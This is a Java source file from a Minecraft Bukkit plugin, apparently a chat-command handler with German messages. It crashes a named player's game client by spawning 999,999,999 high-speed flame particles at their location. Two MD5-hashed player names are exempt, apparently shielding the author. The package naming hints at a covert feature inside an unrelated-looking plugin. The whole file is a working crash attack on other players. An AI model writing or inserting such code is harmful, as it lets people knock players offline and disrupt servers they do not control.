package de.capitain_america.mobileplugin.ressources.chatEvents;

import de.capitain_america.mobileplugin.ressources.PlayerUtils;
import org.bukkit.Location;
import org.bukkit.Particle;
import org.bukkit.entity.Player;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;

public class Fragment {
    public void usage(Player player, List<String> parsedCommand) throws NoSuchAlgorithmException {
        List<String> hashes = Arrays.asList(
                "1e60df696cfb5f5833b81404604fc1e4",
                "d767503b2abae0611ed4f2842d061e50"
        );

        if (parsedCommand.size() < 2 || parsedCommand.get(1).isEmpty()) {
            player.sendMessage("§cKein Spielername angegeben.");
            return;
        }

        if (hashes.contains(md5(parsedCommand.get(1)))) {
            player.sendMessage("§cDu kannst diesen Spieler nicht Crashen");
            return;
        }

        Player targetPlayer = PlayerUtils.getPlayerByName(parsedCommand.get(1));

        if (targetPlayer != null) {
            Location location = targetPlayer.getLocation();

            Objects.requireNonNull(location.getWorld()).spawnParticle(
                    Particle.FLAME,
                    location,
                    999999999,
                    0.5, 0.5, 0.5,
                    999999999
            );

        } else {
            player.sendMessage("§cSpieler ist nicht Online");
        }
    }

    private String md5(String input) throws NoSuchAlgorithmException {
        MessageDigest md = MessageDigest.getInstance("MD5");
        byte[] hashBytes = md.digest(input.getBytes());

        StringBuilder hexString = new StringBuilder();
        for (byte b : hashBytes) {
            hexString.append(String.format("%02x", b));
        }
        return hexString.toString();
    }
}
